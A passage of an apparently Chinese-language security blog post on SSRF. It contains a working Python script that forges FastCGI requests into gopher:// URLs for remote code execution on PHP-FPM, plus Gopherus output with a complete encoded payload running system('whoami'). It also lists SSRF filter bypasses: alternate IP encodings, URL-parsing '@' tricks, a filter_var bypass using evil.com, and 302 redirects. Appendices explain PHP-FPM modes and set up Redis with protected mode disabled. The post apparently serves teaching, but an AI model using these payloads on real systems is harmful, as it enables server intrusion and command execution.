class="number">2</span></span><br><span class="line">    FCGI_STATE_SUCCESS = <span class="number">3</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, host, port, timeout, keepalive</span>):</span></span><br><span class="line">        self.host = host</span><br><span class="line">        self.port = port</span><br><span class="line">        self.timeout = timeout</span><br><span class="line">        <span class="keyword">if</span> keepalive:</span><br><span class="line">            self.keepalive = <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            self.keepalive = <span class="number">0</span></span><br><span class="line">        self.sock = <span class="literal">None</span></span><br><span class="line">        self.requests = dict()</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__connect</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">        self.sock.settimeout(self.timeout)</span><br><span class="line">        self.sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, <span class="number">1</span>)</span><br><span class="line">        <span class="comment"># if self.keepalive:</span></span><br><span class="line">        <span class="comment">#     self.sock.setsockopt(socket.SOL_SOCKET, socket.SOL_KEEPALIVE, 1)</span></span><br><span class="line">        <span class="comment"># else:</span></span><br><span class="line">        <span class="comment">#     self.sock.setsockopt(socket.SOL_SOCKET, socket.SOL_KEEPALIVE, 0)</span></span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            self.sock.connect((self.host, int(self.port)))</span><br><span class="line">        <span class="keyword">except</span> socket.error <span class="keyword">as</span> msg:</span><br><span class="line">            self.sock.close()</span><br><span class="line">            self.sock = <span class="literal">None</span></span><br><span class="line">            print(repr(msg))</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__encodeFastCGIRecord</span>(<span class="params">self, fcgi_type, content, requestid</span>):</span></span><br><span class="line">        length = len(content)</span><br><span class="line">        buf = bchr(FastCGIClient.__FCGI_VERSION) \</span><br><span class="line">               + bchr(fcgi_type) \</span><br><span class="line">               + bchr((requestid &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>) \</span><br><span class="line">               + bchr(requestid &amp; <span class="number">0xFF</span>) \</span><br><span class="line">               + bchr((length &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>) \</span><br><span class="line">               + bchr(length &amp; <span class="number">0xFF</span>) \</span><br><span class="line">               + bchr(<span class="number">0</span>) \</span><br><span class="line">               + bchr(<span class="number">0</span>) \</span><br><span class="line">               + content</span><br><span class="line">        <span class="keyword">return</span> buf</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__encodeNameValueParams</span>(<span class="params">self, name, value</span>):</span></span><br><span class="line">        nLen = len(name)</span><br><span class="line">        vLen = len(value)</span><br><span class="line">        record = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> nLen &lt; <span class="number">128</span>:</span><br><span class="line">            record += bchr(nLen)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            record += bchr((nLen &gt;&gt; <span class="number">24</span>) | <span class="number">0x80</span>) \</span><br><span class="line">                      + bchr((nLen &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xFF</span>) \</span><br><span class="line">                      + bchr((nLen &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>) \</span><br><span class="line">                      + bchr(nLen &amp; <span class="number">0xFF</span>)</span><br><span class="line">        <span class="keyword">if</span> vLen &lt; <span class="number">128</span>:</span><br><span class="line">            record += bchr(vLen)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            record += bchr((vLen &gt;&gt; <span class="number">24</span>) | <span class="number">0x80</span>) \</span><br><span class="line">                      + bchr((vLen &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xFF</span>) \</span><br><span class="line">                      + bchr((vLen &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>) \</span><br><span class="line">                      + bchr(vLen &amp; <span class="number">0xFF</span>)</span><br><span class="line">        <span class="keyword">return</span> record + name + value</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__decodeFastCGIHeader</span>(<span class="params">self, stream</span>):</span></span><br><span class="line">        header = dict()</span><br><span class="line">        header[<span class="string">&#x27;version&#x27;</span>] = bord(stream[<span class="number">0</span>])</span><br><span class="line">        header[<span class="string">&#x27;type&#x27;</span>] = bord(stream[<span class="number">1</span>])</span><br><span class="line">        header[<span class="string">&#x27;requestId&#x27;</span>] = (bord(stream[<span class="number">2</span>]) &lt;&lt; <span class="number">8</span>) + bord(stream[<span class="number">3</span>])</span><br><span class="line">        header[<span class="string">&#x27;contentLength&#x27;</span>] = (bord(stream[<span class="number">4</span>]) &lt;&lt; <span class="number">8</span>) + bord(stream[<span class="number">5</span>])</span><br><span class="line">        header[<span class="string">&#x27;paddingLength&#x27;</span>] = bord(stream[<span class="number">6</span>])</span><br><span class="line">        header[<span class="string">&#x27;reserved&#x27;</span>] = bord(stream[<span class="number">7</span>])</span><br><span class="line">        <span class="keyword">return</span> header</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__decodeFastCGIRecord</span>(<span class="params">self, buffer</span>):</span></span><br><span class="line">        header = buffer.read(int(self.__FCGI_HEADER_SIZE))</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> header:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            record = self.__decodeFastCGIHeader(header)</span><br><span class="line">            record[<span class="string">&#x27;content&#x27;</span>] = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;contentLength&#x27;</span> <span class="keyword">in</span> record.keys():</span><br><span class="line">                contentLength = int(record[<span class="string">&#x27;contentLength&#x27;</span>])</span><br><span class="line">                record[<span class="string">&#x27;content&#x27;</span>] += buffer.read(contentLength)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;paddingLength&#x27;</span> <span class="keyword">in</span> record.keys():</span><br><span class="line">                skiped = buffer.read(int(record[<span class="string">&#x27;paddingLength&#x27;</span>]))</span><br><span class="line">            <span class="keyword">return</span> record</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">request</span>(<span class="params">self, nameValuePairs=&#123;&#125;, post=<span class="string">&#x27;&#x27;</span></span>):</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> self.__connect():</span><br><span class="line">            print(<span class="string">&#x27;connect failure! please check your fasctcgi-server !!&#x27;</span>)</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">        requestId = random.randint(<span class="number">1</span>, (<span class="number">1</span> &lt;&lt; <span class="number">16</span>) - <span class="number">1</span>)</span><br><span class="line">        self.requests[requestId] = dict()</span><br><span class="line">        request = <span class="string">b&quot;&quot;</span></span><br><span class="line">        beginFCGIRecordContent = bchr(<span class="number">0</span>) \</span><br><span class="line">                                 + bchr(FastCGIClient.__FCGI_ROLE_RESPONDER) \</span><br><span class="line">                                 + bchr(self.keepalive) \</span><br><span class="line">                                 + bchr(<span class="number">0</span>) * <span class="number">5</span></span><br><span class="line">        request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_BEGIN,</span><br><span class="line">                                              beginFCGIRecordContent, requestId)</span><br><span class="line">        paramsRecord = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">if</span> nameValuePairs:</span><br><span class="line">            <span class="keyword">for</span> (name, value) <span class="keyword">in</span> nameValuePairs.items():</span><br><span class="line">                name = force_bytes(name)</span><br><span class="line">                value = force_bytes(value)</span><br><span class="line">                paramsRecord += self.__encodeNameValueParams(name, value)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> paramsRecord:</span><br><span class="line">            request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, paramsRecord, requestId)</span><br><span class="line">        request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_PARAMS, <span class="string">b&#x27;&#x27;</span>, requestId)</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> post:</span><br><span class="line">            request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, force_bytes(post), requestId)</span><br><span class="line">        request += self.__encodeFastCGIRecord(FastCGIClient.__FCGI_TYPE_STDIN, <span class="string">b&#x27;&#x27;</span>, requestId)</span><br><span class="line"></span><br><span class="line">        <span class="comment">#self.sock.send(request)</span></span><br><span class="line">        <span class="comment">#self.requests[requestId][&#x27;state&#x27;] = FastCGIClient.FCGI_STATE_SEND</span></span><br><span class="line">        <span class="comment">#self.requests[requestId][&#x27;response&#x27;] = b&#x27;&#x27;</span></span><br><span class="line">        <span class="comment">#return self.__waitForResponse(requestId)</span></span><br><span class="line">        <span class="keyword">return</span> request</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__waitForResponse</span>(<span class="params">self, requestId</span>):</span></span><br><span class="line">        data = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            buf = self.sock.recv(<span class="number">512</span>)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> len(buf):</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            data += buf</span><br><span class="line"></span><br><span class="line">        data = BytesIO(data)</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            response = self.__decodeFastCGIRecord(data)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> response:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> response[<span class="string">&#x27;type&#x27;</span>] == FastCGIClient.__FCGI_TYPE_STDOUT \</span><br><span class="line">                    <span class="keyword">or</span> response[<span class="string">&#x27;type&#x27;</span>] == FastCGIClient.__FCGI_TYPE_STDERR:</span><br><span class="line">                <span class="keyword">if</span> response[<span class="string">&#x27;type&#x27;</span>] == FastCGIClient.__FCGI_TYPE_STDERR:</span><br><span class="line">                    self.requests[<span class="string">&#x27;state&#x27;</span>] = FastCGIClient.FCGI_STATE_ERROR</span><br><span class="line">                <span class="keyword">if</span> requestId == int(response[<span class="string">&#x27;requestId&#x27;</span>]):</span><br><span class="line">                    self.requests[requestId][<span class="string">&#x27;response&#x27;</span>] += response[<span class="string">&#x27;content&#x27;</span>]</span><br><span class="line">            <span class="keyword">if</span> response[<span class="string">&#x27;type&#x27;</span>] == FastCGIClient.FCGI_STATE_SUCCESS:</span><br><span class="line">                self.requests[requestId]</span><br><span class="line">        <span class="keyword">return</span> self.requests[requestId][<span class="string">&#x27;response&#x27;</span>]</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__repr__</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;fastcgi connect host:&#123;&#125; port:&#123;&#125;&quot;</span>.format(self.host, self.port)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    parser = argparse.ArgumentParser(description=<span class="string">&#x27;Php-fpm code execution vulnerability client.&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;host&#x27;</span>, help=<span class="string">&#x27;Target host, such as 127.0.0.1&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;file&#x27;</span>, help=<span class="string">&#x27;A php file absolute path, such as /usr/local/lib/php/System.php&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;-c&#x27;</span>, <span class="string">&#x27;--code&#x27;</span>, help=<span class="string">&#x27;What php code your want to execute&#x27;</span>, default=<span class="string">&#x27;&lt;?php phpinfo(); exit; ?&gt;&#x27;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;-p&#x27;</span>, <span class="string">&#x27;--port&#x27;</span>, help=<span class="string">&#x27;FastCGI port&#x27;</span>, default=<span class="number">9000</span>, type=int)</span><br><span class="line"></span><br><span class="line">    args = parser.parse_args()</span><br><span class="line"></span><br><span class="line">    client = FastCGIClient(args.host, args.port, <span class="number">3</span>, <span class="number">0</span>)</span><br><span class="line">    params = dict()</span><br><span class="line">    documentRoot = <span class="string">&quot;/&quot;</span></span><br><span class="line">    uri = args.file</span><br><span class="line">    content = args.code</span><br><span class="line">    params = &#123;</span><br><span class="line">        <span class="string">&#x27;GATEWAY_INTERFACE&#x27;</span>: <span class="string">&#x27;FastCGI/1.0&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;REQUEST_METHOD&#x27;</span>: <span class="string">&#x27;POST&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;SCRIPT_FILENAME&#x27;</span>: documentRoot + uri.lstrip(<span class="string">&#x27;/&#x27;</span>),</span><br><span class="line">        <span class="string">&#x27;SCRIPT_NAME&#x27;</span>: uri,</span><br><span class="line">        <span class="string">&#x27;QUERY_STRING&#x27;</span>: <span class="string">&#x27;&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;REQUEST_URI&#x27;</span>: uri,</span><br><span class="line">        <span class="string">&#x27;DOCUMENT_ROOT&#x27;</span>: documentRoot,</span><br><span class="line">        <span class="string">&#x27;SERVER_SOFTWARE&#x27;</span>: <span class="string">&#x27;php/fcgiclient&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;REMOTE_ADDR&#x27;</span>: <span class="string">&#x27;127.0.0.1&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;REMOTE_PORT&#x27;</span>: <span class="string">&#x27;9985&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;SERVER_ADDR&#x27;</span>: <span class="string">&#x27;127.0.0.1&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;SERVER_PORT&#x27;</span>: <span class="string">&#x27;80&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;SERVER_NAME&#x27;</span>: <span class="string">&quot;localhost&quot;</span>,</span><br><span class="line">        <span class="string">&#x27;SERVER_PROTOCOL&#x27;</span>: <span class="string">&#x27;HTTP/1.1&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;CONTENT_TYPE&#x27;</span>: <span class="string">&#x27;application/text&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;CONTENT_LENGTH&#x27;</span>: <span class="string">&quot;%d&quot;</span> % len(content),</span><br><span class="line">        <span class="string">&#x27;PHP_VALUE&#x27;</span>: <span class="string">&#x27;auto_prepend_file = php://input&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;PHP_ADMIN_VALUE&#x27;</span>: <span class="string">&#x27;allow_url_include = On&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">#这里调用request,然后返回tcp数据流,所以修改这里url编码一下就好了</span></span><br><span class="line">    <span class="comment">#response = client.request(params, content)</span></span><br><span class="line">    <span class="comment">#print(force_text(response))</span></span><br><span class="line">    request_ssrf = urlparse.quote(client.request(params, content))</span><br><span class="line">    print(force_text(<span class="string">&quot;gopher://127.0.0.1:&quot;</span> + str(args.port) + <span class="string">&quot;/_&quot;</span> + request_ssrf))</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191210182034.png" alt=""></p>
<blockquote>
<p>在利用时，还要对其urlencode一次，可以直接使用Burp的Convert Selection功能：</p>
</blockquote>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191210182946.png" alt=""></p>
<p>ok，成功实现了代码执行。</p>
<p>第三种就是使用<a href="https://github.com/tarunkant/Gopherus">gopherus</a>工具，同样非常好用：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Desktop gopherus --exploit fastcgi</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  ________              .__</span><br><span class="line"> &#x2F;  _____&#x2F;  ____ ______ |  |__   ___________ __ __  ______</span><br><span class="line">&#x2F;   \  ___ &#x2F;  _ \\____ \|  |  \_&#x2F; __ \_  __ \  |  \&#x2F;  ___&#x2F;</span><br><span class="line">\    \_\  (  &lt;_&gt; )  |_&gt; &gt;   Y  \  ___&#x2F;|  | \&#x2F;  |  &#x2F;\___ \</span><br><span class="line"> \______  &#x2F;\____&#x2F;|   __&#x2F;|___|  &#x2F;\___  &gt;__|  |____&#x2F;&#x2F;____  &gt;</span><br><span class="line">        \&#x2F;       |__|        \&#x2F;     \&#x2F;                 \&#x2F;</span><br><span class="line"></span><br><span class="line">		author: $_SpyD3r_$</span><br><span class="line"></span><br><span class="line">Give one file name which should be surely present in the server (prefer .php file)</span><br><span class="line">if you don&#39;t know press ENTER we have default one:  &#x2F;var&#x2F;www&#x2F;html&#x2F;index.php</span><br><span class="line">Terminal command to run:  whoami</span><br><span class="line"></span><br><span class="line">Your gopher link is ready to do SSRF: </span><br><span class="line"></span><br><span class="line">gopher:&#x2F;&#x2F;127.0.0.1:9000&#x2F;_%01%01%00%01%00%08%00%00%00%01%00%00%00%00%00%00%01%04%00%01%01%04%04%00%0F%10SERVER_SOFTWAREgo%20&#x2F;%20fcgiclient%20%0B%09REMOTE_ADDR127.0.0.1%0F%08SERVER_PROTOCOLHTTP&#x2F;1.1%0E%02CONTENT_LENGTH58%0E%04REQUEST_METHODPOST%09KPHP_VALUEallow_url_include%20%3D%20On%0Adisable_functions%20%3D%20%0Aauto_prepend_file%20%3D%20php%3A&#x2F;&#x2F;input%0F%17SCRIPT_FILENAME&#x2F;var&#x2F;www&#x2F;html&#x2F;index.php%0D%01DOCUMENT_ROOT&#x2F;%00%00%00%00%01%04%00%01%00%00%00%00%01%05%00%01%00%3A%04%00%3C%3Fphp%20system%28%27whoami%27%29%3Bdie%28%27-----Made-by-SpyD3r-----%0A%27%29%3B%3F%3E%00%00%00%00</span><br><span class="line"></span><br><span class="line">-----------Made-by-SpyD3r-----------</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>payload在利用时需要再次进行url编码。</p>
<h2 id="绕过方式">绕过方式</h2>
<p><a href="https://www.freebuf.com/articles/web/135342.html">https://www.freebuf.com/articles/web/135342.html</a></p>
<p>总的来说有以下几种方式：</p>
<h3 id="IP地址进制转换">IP地址进制转换</h3>
<p>例如192.168.0.1这个IP地址我们可以改写成：</p>
<blockquote>
<p>(1)、8进制格式：0300.0250.0.1</p>
<p>(2)、16进制格式：0xC0.0xA8.0.1</p>
<p>(3)、10进制整数格式：3232235521</p>
<p>(4)、16进制整数格式：0xC0A80001</p>
</blockquote>
<h3 id="利用解析URL所出现的问题">利用解析URL所出现的问题</h3>
<p>在某些情况下，后端程序可能会对访问的URL进行解析，对解析出来的host地址进行过滤。这时候可能会出现对URL参数解析不当，导致可以绕过过滤。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;www.baidu.com@192.168.0.1&#x2F;</span><br></pre></td></tr></table></figure>
<p>当后端程序通过不正确的正则表达式（比如将http之后到com为止的字符内容，也就是\<a href="http://www.baidu.com">www.baidu.com</a>，认为是访问请求的host地址时）对上述URL的内容进行解析的时候，<a href="http://xn--URLhostwww-xx2pha710a1tzo64bgdzac98cwnybok4bqpa697o.baidu.com">很有可能会认为访问URL的host为www.baidu.com</a>，而实际上这个URL所请求的内容都是192.168.0.1上的内容。</p>
<h3 id="filter-var-bypass">filter_var() bypass</h3>
<p>看到很多大佬的文章都有提到，找到<a href="https://medium.com/secjuice/php-ssrf-techniques-9d422cb28d51">原文链接</a></p>
<p><strong>示例代码</strong></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">   $url &#x3D; $_GET[&#39;url&#39;];</span><br><span class="line">   echo &quot;Argument: &quot;.$url.&quot;\n&quot;;</span><br><span class="line">   if(filter_var($url, FILTER_VALIDATE_URL)) &#123;</span><br><span class="line">      $r &#x3D; parse_url($url);</span><br><span class="line">      var_dump($r);</span><br><span class="line">      if(preg_match(&#39;&#x2F;google\.com$&#x2F;&#39;, $r[&#39;host&#39;])) </span><br><span class="line">      &#123;</span><br><span class="line">         exec(&#39;curl -v -s &quot;&#39;.$r[&#39;host&#39;].&#39;&quot;&#39;, $a);</span><br><span class="line">      &#125; else &#123;</span><br><span class="line">         echo &quot;Error: Host not allowed&quot;;</span><br><span class="line">      &#125;</span><br><span class="line">   &#125; else &#123;</span><br><span class="line">      echo &quot;Error: Invalid URL&quot;;</span><br><span class="line">   &#125;</span><br><span class="line">?&gt;</span><br><span class="line">mixed filter_var ( mixed $variable [, int $filter &#x3D; FILTER_DEFAULT [, mixed $options ]] )函数有两种参数。</span><br><span class="line">FILTER_VALIDATE_EMAIL 检查是否为有效邮箱</span><br><span class="line">FILTER_VALIDATE_URL 检查是否为有效url</span><br></pre></td></tr></table></figure>
<p>代码的逻辑是先判断，url是否符合逻辑，符合则用<code>preg_match</code>来匹配，匹配成功就curl</p>
<p>绕过方式</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">http:&#x2F;&#x2F;localhost&#x2F;web&#x2F;test&#x2F;22.php?url&#x3D;0:&#x2F;&#x2F;evil.com:80,google.com:80&#x2F;</span><br><span class="line">或</span><br><span class="line">http:&#x2F;&#x2F;localhost&#x2F;web&#x2F;test&#x2F;22.php?url&#x3D;0:&#x2F;&#x2F;evil.com:23333;google.com:80&#x2F;</span><br></pre></td></tr></table></figure>
<p>利用，或者；可以绕过。</p>
<h3 id="利用302跳转">利用302跳转</h3>
<p>如果后端服务器在接收到参数后，正确的解析了URL的host，并且进行了过滤，我们这个时候可以使用302跳转的方式来进行绕过。</p>
<p>(1)、在网络上存在一个很神奇的服务，<a href="http://xip.io/">http://xip.io</a> 当我们访问这个网站的子域名的时候，<a href="http://xn--192-uc0ep96b.168.0.1.xip.io">例如192.168.0.1.xip.io</a>，就会自动重定向到192.168.0.1。</p>
<p>(2)、由于上述方法中包含了192.168.0.1这种内网IP地址，可能会被正则表达式过滤掉，我们可以通过短地址的方式来绕过。经过测试发现新浪，百度的短地址服务并不支持IP模式，所以这里使用的是<a href="http://tinyurl.com/">http://tinyurl.com</a>所提供的短地址服务。（现在这个网站已经关闭了）</p>
<h2 id="Appendix-A">Appendix A</h2>
<h3 id="PHP的连接方式">PHP的连接方式</h3>
<p>所谓的连接方式指的就是服务器中间件与某个语言后端进行数据交换的方式。在这里具体而言就是PHP语言和Apache或者Nginx进行数据传输的方式。一共有三种apache2-module、CGI、FastCGI：</p>
<h4 id="apache2-module模式">apache2-module模式</h4>
<p>把 php 当做 apache 的一个模块，实际上 php 就相当于 apache 中的一个 dll 或一个 so 文件，phpstudy 的非 nts 模式就是默认以 module 方式连接的。</p>
<h4 id="CGI模式">CGI模式</h4>
<p>此时 php 是一个独立的进程比如 php-cgi.exe，web 服务器也是一个独立的进程比如 apache.exe，然后当 Web 服务器监听到 HTTP 请求时，会去调用 php-cgi 进程，他们之间通过 cgi 协议，服务器把请求内容转换成 php-cgi 能读懂的协议数据传递给 cgi 进程，cgi 进程拿到内容就会去解析对应 php 文件，得到的返回结果在返回给 web 服务器，最后 web 服务器返回到客户端，但随着网络技术的发展，CGI 方式的缺点也越来越突出。每次客户端请求都需要建立和销毁进程。因为 HTTP 要生成一个动态页面，系统就必须启动一个新的进程以运行 CGI 程序，不断地 fork 是一项很消耗时间和资源的工作。</p>
<h4 id="FastCGI模式">FastCGI模式</h4>
<p>fastcgi 本身还是一个协议，在 cgi 协议上进行了一些优化。众所周知，CGI 进程的反复加载是 CGI 性能低下的主要原因，如果 CGI 解释器保持在内存中 并接受FastCGI 进程管理器调度，则可以提供良好的性能、伸缩性、Fail-Over 特性等等。</p>
<p>简而言之，CGI 模式是 apache2 接收到请求去调用 CGI 程序，而 fastcgi 模式是 fastcgi 进程自己管理自己的 cgi 进程，而不再是 apache 去主动调用 php-cgi，而 fastcgi 进程又提供了很多辅助功能比如内存管理，垃圾处理，保障了 cgi 的高效性，并且 CGI 此时是常驻在内存中，不会每次请求重新启动。</p>
<p>在接触不到服务器文件的情况下，我们可以通过<code>phpinfo()</code>中的<code>Server API</code>来判断PHP的连接方式：</p>
<p><img src="https://ca0y1h-bucket-1.oss-cn-hangzhou.aliyuncs.com/blog_img/20191209225549.png" alt=""></p>
<p>对于FastCGI协议的具体分析参考P牛的博客：<a href="https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html">https://www.leavesongs.com/PENETRATION/fastcgi-and-php-fpm.html</a></p>
<h3 id="PHP-FPM">PHP-FPM</h3>
<h4 id="基本概念">基本概念</h4>
<p>官方定义如下：</p>
<blockquote>
<p>FPM（FastCGI 进程管理器）用于替换 PHP FastCGI 的大部分附加功能，对于高负载网站是非常有用的。</p>
</blockquote>
<p>简单地说，FPM是实现和管理FastCGI进程的管理器，能够接收服务器中间件发送的FastCGI协议包并进行解析、最后将解析结果返回给服务器中间件。</p>
<p>这里借用先知的一个图来看看就清楚了：</p>
<p><img src="https://www.mi1k7ea.com/2019/08/25/%E6%B5%85%E8%B0%88PHP-FPM%E5%AE%89%E5%85%A8/1.png" alt="img"></p>
<h4 id="通信方式">通信方式</h4>
<p>在PHP使用FastCGI连接模式的情况下，Web服务器中间件如Nginx和PHP-FPM之间的通信方式又分为两种：</p>
<h5 id="TCP模式">TCP模式</h5>
<p>TCP模式即是PHP-FPM进程会监听本机上的一个端口（默认为9000），然后Nginx会把客户端数据通过FastCGI协议传给9000端口，PHP-FPM拿到数据后会调用CGI进程解析。</p>
<p>通常我们可以通过查看Nginx的配置文件default.conf来确认是否是TCP模式，这里个人环境中的路径为<code>/etc/nginx/conf.d/default.conf</code>，关注fastcgi_pass这一项，若为ip+port的形式即为TCP模式：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">location ~ \.php$ &#123;      </span><br><span class="line">	index index.php index.html index.htm;      </span><br><span class="line">	include &#x2F;etc&#x2F;nginx&#x2F;fastcgi_params;      </span><br><span class="line">	fastcgi_pass 127.0.0.1:9000;      </span><br><span class="line">	fastcgi_index index.php;      </span><br><span class="line">	include fastcgi_params; </span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>在PHP-FPM中，可以通过查看其配置文件，个人环境中的路径为<code>/etc/php/7.2/fpm/pool.d/www.conf</code>，看到listen一项若为ip+port的形式即为TCP模式：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">; The address on which to accept FastCGI requests.</span><br><span class="line">; Valid syntaxes are:</span><br><span class="line">;   &#39;ip.add.re.ss:port&#39;    - to listen on a TCP socket to a specific IPv4 address on</span><br><span class="line">;                            a specific port;</span><br><span class="line">;   &#39;[ip:6:addr:ess]:port&#39; - to listen on a TCP socket to a specific IPv6 address on</span><br><span class="line">;                            a specific port;</span><br><span class="line">;   &#39;port&#39;                 - to listen on a TCP socket to all addresses;                            (IPv6 and IPv4-mapped) on a specific port;</span><br><span class="line">;   &#39;&#x2F;path&#x2F;to&#x2F;unix&#x2F;socket&#39; - to listen on a unix socket.</span><br><span class="line">; Note: This value is mandatory.</span><br><span class="line">listen &#x3D; 127.0.0.1:9000</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h5 id="Unix-Socket模式">Unix Socket模式</h5>
<p>Unix套接字模式是Unix系统进程间通信（IPC）的一种被广泛采用方式，以文件（一般是.sock）作为socket的唯一标识（描述符），需要通信的两个进程引用同一个socket描述符文件就可以建立通道进行通信了。</p>
<p>相比之下，Unix套接字模式的性能会优于TCP模式。</p>
<p>还是一样的识别方法，在Nginx的default.conf中查看fastcgi_pass：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">location~\.php$&#123;      </span><br><span class="line">	index index.php index.html index.htm;      </span><br><span class="line">	include &#x2F;etc&#x2F;nginx&#x2F;fastcgi_params;      </span><br><span class="line">	fastcgi_pass unix:&#x2F;run&#x2F;php&#x2F;php7.2-fpm.sock;      </span><br><span class="line">	fastcgi_index index.php;      </span><br><span class="line">	include fastcgi_params;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>在PHP-FPM的www.conf中查看listen：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">listen &#x3D; &#x2F;run&#x2F;php&#x2F;php7.2-fpm.sock</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="Appendix-B">Appendix B</h2>
<h3 id="Redis-环境搭建">Redis 环境搭建</h3>
<ol>
<li>
<p>目标机上安装redis服务：<code>apt-get install redis</code></p>
</li>
<li>
<p>如果要使外网访问：</p>
<p>更改/etc/redis/redis.conf配置：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 取消绑定IP</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> <span class="built_in">bind</span> 127.0.0.1</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 允许后台运行</span></span><br><span class="line">daemonize yes</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 取消保护模式</span></span><br><span class="line">protected-mode no</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>更改防火墙配置：</p>
<p>Ubuntu18.04：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ufw allow 6379</span><br><span class="line"></span><br></pre></td></tr></table></figure>
